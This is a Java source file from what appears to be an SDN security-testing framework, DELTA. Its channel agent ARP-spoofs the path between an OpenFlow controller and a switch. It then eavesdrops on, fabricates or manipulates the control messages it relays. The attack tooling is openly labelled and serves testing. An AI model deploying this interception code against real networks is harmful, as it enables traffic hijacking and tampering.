package org.deltaproject.channelagent.pkthandle;

import io.netty.buffer.ByteBuf;
import jpcap.NetworkInterface;
import jpcap.PacketReceiver;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import org.deltaproject.channelagent.core.Utils;
import org.deltaproject.channelagent.dummy.DummyOFSwitch;
import org.deltaproject.channelagent.fuzz.SeedPackets;
import org.deltaproject.channelagent.networknode.TopoInfo;
import org.deltaproject.channelagent.testcase.TestAdvancedSet;
import org.projectfloodlight.openflow.exceptions.OFParseError;
import org.projectfloodlight.openflow.protocol.OFFactories;
import org.projectfloodlight.openflow.protocol.OFFactory;
import org.projectfloodlight.openflow.protocol.OFVersion;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

//import java.lang.UnsupportedOperationException;
//import jpcap.packet.TCPPacket;
//import jpcap.packet.UDPPacket;

public class PktListener {
	public static final int MINIMUM_LENGTH = 8;



	private static HashMap<String, String> ip_mac_list;
	private static NetworkInterface device;
	private static ArrayList<String> ips_to_explore;

	// used to filter packets for and from the attacker
	private static String localIp;

	// victim A, B
	private static String controllerIP;
	private static String switchIP;

	private Listener traffic_listener;
	private Sender traffic_sender;

	private PacketReceiver handler;

	private String output;
	protected TopoInfo topo;
	private ARPSpoof spoof;

	// flags for distinguish the kind of attacks
	private int typeOfAttacks;
	private String ofPort;
	private byte ofversion;

	protected TestAdvancedSet testAdvanced;
	private SeedPackets seedPkts;

	public PktListener(NetworkInterface mydevice, String controllerip, String switchip, byte OFversion, String port,
			String handler) {
		// set variable
		ofversion = OFversion;
		device = mydevice;
		ofPort = port;

		// set IP list
		controllerIP = controllerip;
		switchIP = switchip;
		localIp = Utils.__get_inet4(device).address.toString().split("/")[1];
		ips_to_explore = new ArrayList<String>();
		setIpsToExplore(controllerip, switchip);

		topo = new TopoInfo();

		// set OF version
		OFFactory factory = null;
		if (OFversion == 0x01)
			factory = OFFactories.getFactory(OFVersion.OF_10);
		else if (OFversion == 0x04)
			factory = OFFactories.getFactory(OFVersion.OF_13);
		if (factory != null)
			testAdvanced = new TestAdvancedSet(factory, this.ofversion);

		// set Handler
		this.handler = new middle_handler();

		typeOfAttacks = TestAdvancedSet.EMPTY;
		seedPkts = new SeedPackets(factory);
	}

	public void testfunc() {

	}

	public void startListening() {
		try {
			this.traffic_listener = new Listener(device, this.handler);
			this.traffic_listener.setFilter("port " + this.ofPort, true);
			this.traffic_listener.start();

			this.traffic_sender = new Sender(device);

		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public SeedPackets getSeedPackets() {
		return this.seedPkts;
	}

	public String getTopoInfo() {
		if(topo == null) 
			return "null";
		else
			return topo.getTopoInfo();
	}

	public void setIpsToExplore(String contip, String switchip) {
		ips_to_explore.add(contip);
		ips_to_explore.add(switchip);
	}

	public void startARPSpoofing() {
		System.out.println("[Channel-Agent] Start ARP Spoofing");

		spoof = new ARPSpoof(device, ips_to_explore);
		spoof.setSender(this.traffic_sender);
		ip_mac_list = new HashMap<String, String>();
		HostDiscover hosty = new HostDiscover(device, ips_to_explore);
		hosty.discover();
		ip_mac_list.putAll(hosty.getHosts());
		spoof.setMacList(ip_mac_list);

		this.spoof.setARPspoof(true);
		this.spoof.start();
	}

	public void stopARPSpoofing() {
		System.out.println("[Channel-Agent] Stop ARP Spoofing");
		this.spoof.setARPspoof(false);
	}

	public void setARPspoofing(boolean value) {
		this.spoof.setARPspoof(value);
	}

	public String getOutput() {
		return this.output;
	}

	public int getTypeOfAttacks() {
		return typeOfAttacks;
	}

	public void setTypeOfAttacks(int typeOfAttacks) {
		this.typeOfAttacks = typeOfAttacks;
	}

	public boolean testSwitchIdentification() {
		testAdvanced.testSwitchIdentificationSpoofing(this.controllerIP, this.ofPort, this.ofversion);		
		return true;
	}
	
	class middle_handler implements PacketReceiver {
		private String dst_ip;
		private String src_ip;

		private boolean isTested = false;
		Map<Long, TCPBodyData> tcpBodys = new HashMap<Long, TCPBodyData>();

		// for fragmented tcp data
		private class TCPBodyData {
			byte[] bytes = null;

			public TCPBodyData(byte[] bytes) {
				this.bytes = bytes;
			}

			public void addBytes(byte[] bytes) {
				try {
					ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
					outputStream.write(this.bytes);
					outputStream.write(bytes);
					this.bytes = outputStream.toByteArray();
				} catch (IOException e) {
					e.printStackTrace();
				}

			}

			public byte[] getBytes() {
				return bytes;
			}
		}

		private byte[] addBodyData(TCPPacket packet) {
			TCPBodyData tcpBodyData;
			Long ack = new Long(packet.ack_num);
			if (tcpBodys.containsKey(ack)) {
				tcpBodyData = tcpBodys.get(ack);
				tcpBodyData.addBytes(packet.data);
			} else {
				tcpBodyData = new TCPBodyData(packet.data);
				tcpBodys.put(ack, tcpBodyData);
			}

			if (packet.psh) {
				tcpBodys.remove(ack);
			}

			return tcpBodyData.getBytes();
		}

		public void sendPkt(Packet p_temp) {
			if (this.src_ip.equals(switchIP) && this.dst_ip.equals(controllerIP)) {
				traffic_sender.send(spoofPacket(p_temp, controllerIP));
			} else if (this.src_ip.equals(controllerIP) && this.dst_ip.equals(switchIP)) {
				traffic_sender.send(spoofPacket(p_temp, switchIP));
			}
		}
		
		public void receivePacket(Packet p_temp) {
			EthernetPacket p_eth = (EthernetPacket) p_temp.datalink;

			// check if the packet is mine just return do not send it again
			String mine_mac = Utils.decalculate_mac(device.mac_address);
			String incoming_src_mac = Utils.decalculate_mac(p_eth.src_mac);

			IPPacket p = ((IPPacket) p_temp);
			this.dst_ip = p.dst_ip.toString().split("/")[1];
			this.src_ip = p.src_ip.toString().split("/")[1];

			// ignore channel-agent packets
			if (this.dst_ip.equals(localIp) || this.src_ip.equals(localIp) || mine_mac.equals(incoming_src_mac)) {
				return;
			} else if (p_temp.data.length < 8) {
				if (this.src_ip.equals(controllerIP) && this.dst_ip.equals(switchIP)) {
					traffic_sender.send(spoofPacket(p_temp, switchIP));
				} else if (this.src_ip.equals(switchIP) && this.dst_ip.equals(controllerIP)) {
					traffic_sender.send(spoofPacket(p_temp, controllerIP));
				}
				return;
			}

			if (typeOfAttacks == TestAdvancedSet.EVAESDROP) {
				this.sendPkt(p_temp);
				
				if (p_temp.data.length > 8) {					
					try {
						testAdvanced.testEvaseDrop(topo, p_temp);
					} catch (OFParseError e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (typeOfAttacks == TestAdvancedSet.LINKFABRICATION) {
				ByteBuf newBuf = null;
				if (p_temp.data.length > 8) {
					try {
						newBuf = testAdvanced.testLinkFabrication(p_temp);
					} catch (OFParseError e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}

				if (newBuf != null) {
					byte[] bytes;
					int length = newBuf.readableBytes();

					if (newBuf.hasArray()) {
						bytes = newBuf.array();
					} else {
						bytes = new byte[length];
						newBuf.getBytes(newBuf.readerIndex(), bytes);
					}

					// replace packet data
					newBuf.clear();
					p_temp.data = bytes;
				}
				
				this.sendPkt(p_temp);
			} else if (typeOfAttacks == TestAdvancedSet.MITM) {
				ByteBuf newBuf = null;
				if (p_temp.data.length > 8) {
					try {
						newBuf = testAdvanced.testMITM(p_temp);
					} catch (OFParseError e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}

				if (newBuf != null) {
					byte[] bytes;
					int length = newBuf.readableBytes();

					if (newBuf.hasArray()) {
						bytes = newBuf.array();
					} else {
						bytes = new byte[length];
						newBuf.getBytes(newBuf.readerIndex(), bytes);
					}

					// replace packet data
					newBuf.clear();
					p_temp.data = bytes;
				}
				
				this.sendPkt(p_temp);
			} else if (typeOfAttacks == TestAdvancedSet.CONTROLMESSAGEMANIPULATION) {
				System.out.println("\n[ATTACK] Control Message Manipulation");
				/* Modify a Packet Here */
				if (this.dst_ip.equals(controllerIP)) {
					(p.data)[2] = 0x77;
					(p.data)[3] = 0x77;
				}
			} else if (typeOfAttacks == TestAdvancedSet.MALFORMEDCONTROLMESSAGE) {
				System.out.println("\n[ATTACK] Malformed Control Message");
				/* Modify a Packet Here */
				if (this.dst_ip.equals(switchIP)) {
					// if ( (p.data)[1] != 0x0a ) {
					(p.data)[2] = 0x00;
					(p.data)[3] = 0x01;
					// }
				}
			} else if (typeOfAttacks == TestAdvancedSet.SEED) {
				/* Modify a Packet Here */
				if (this.src_ip.equals(switchIP) && this.dst_ip.equals(controllerIP)) {
					// System.out.print(switchIP + " -> " + controllerIP + " ");
					try {
						seedPkts.getSeedPkts(p.data, p.data.length);
					} catch (OFParseError e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				return;
			}		
			return;
		}

		private Packet spoofPacket(Packet p, String victim) {
			EthernetPacket p_eth = (EthernetPacket) p.datalink;
			EthernetPacket ether = new EthernetPacket();
			ether.frametype = p_eth.frametype;

			ether.src_mac = device.mac_address;// p_eth.src_mac;
			// only difference now is that for dst mac now is the official
			ether.dst_mac = Utils.calculate_mac(ip_mac_list.get(victim));

			p.datalink = ether;

			return p;
		}
	}
}
